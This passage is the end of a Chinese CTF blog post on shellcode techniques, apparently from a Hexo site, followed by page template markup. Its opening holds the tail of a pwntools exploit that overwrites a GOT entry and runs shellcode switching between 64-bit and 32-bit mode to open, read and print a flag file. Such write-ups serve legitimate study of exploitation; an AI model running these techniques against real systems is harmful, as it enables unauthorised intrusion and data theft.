class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>		edit(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>		payload = asm(<span class="hljs-string">&#x27;push 0x23;push &#x27;</span>+<span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">9</span>)+<span class="hljs-string">&#x27;;retfq&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>		payload += asm(<span class="hljs-string">&#x27;mov esp, &#x27;</span>+<span class="hljs-built_in">hex</span>(target+<span class="hljs-number">0x50</span>)+<span class="hljs-string">&#x27;;push 0x6761;push 0x6c662f2e;push esp;pop ebx; xor ecx,ecx; mov eax,5; int 0x80&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>		payload += asm(<span class="hljs-string">&#x27;push 0x33;push &#x27;</span>+<span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">0x2b</span>)+<span class="hljs-string">&#x27;;retf&#x27;</span>)<br>		payload += asm(<span class="hljs-string">&#x27;mov rdi,rax; mov rsi,0x602080;mov rdx, 0x100;mov rax, 0;syscall;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>		payload += asm(<span class="hljs-string">&#x27;mov rdi,1;mov rax ,1;syscall;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>		edit(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,payload)<br>		edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p64(addr))<br>		<span class="hljs-comment">#attach(sh,&#x27;b*&#x27;+str(addr))</span><br>		delete(<span class="hljs-number">6</span>)<br>		sh.interactive()<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>shellcode技巧</div>
+      <div>https://h0pe-ay.github.io/shellcode的技巧/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>hope</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/awd/" title="awd">
+                        <span class="hidden-mobile">awd</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
